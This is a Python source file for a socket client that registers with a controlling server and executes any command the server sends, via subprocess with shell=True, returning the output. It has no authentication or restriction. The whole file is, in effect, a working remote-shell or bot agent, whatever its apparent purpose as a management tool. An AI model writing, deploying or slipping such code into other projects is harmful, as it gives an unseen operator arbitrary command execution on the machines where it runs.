import json
import struct
import subprocess
from socket import *


class Client:
    def __init__(self):
        self.socket = socket()

    def connect(self, host: str, port: int) -> None:
        self.socket.connect((host, port))

    def run(self) -> None:
        # join client connection
        self.send_message(code=200, data="", error="")
        print(self.recv_message(1024))

        while 1:
            try:
                response_data = self.recv_message(1024)
                if not response_data:
                    continue

                if response_data["code"] == "500":

                    manage_ipaddr_port = response_data["data"]["manage"]

                    command = response_data["data"]["command"]

                    result = subprocess.Popen(
                        args=command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )

                    stdout = result.stdout.read()
                    stderr = result.stderr.read()

                    send_data = {
                        "manage": manage_ipaddr_port,
                        "result": stdout.decode("utf-8") or stderr.decode("utf-8")
                    }

                    self.send_message(code=600, data=send_data, error="")

            except Exception:
                break

    def send_message(self, code: int, data: str, error: str) -> None:

        request_data = json.dumps({
            "code": str(code),
            "data": data,
            "error": error
        })

        request_headers = {
            "data_length": len(request_data),
        }

        request_headers_json = json.dumps(request_headers)
        request_headers_length = struct.pack("i", len(request_headers_json))

        request_data = request_headers_length + \
            request_headers_json.encode("utf-8") + request_data.encode("utf-8")

        self.socket.send(request_data)

    def recv_message(self, recv_size: int) -> str:

        response_headers_length = struct.unpack("i", self.socket.recv(4))[0]

        response_headers = json.loads(
            self.socket.recv(response_headers_length).decode("utf-8"))

        response_body_length = response_headers["data_length"]

        response_body = b""
        current_recv_response_body_length = 0

        while current_recv_response_body_length < response_body_length:
            current_recv_response = self.socket.recv(recv_size)
            response_body += current_recv_response
            current_recv_response_body_length += len(current_recv_response)

        return json.loads(response_body.decode("utf-8"))


if __name__ == "__main__":
    client = Client()
    client.connect("localhost", 8080)
    client.run()
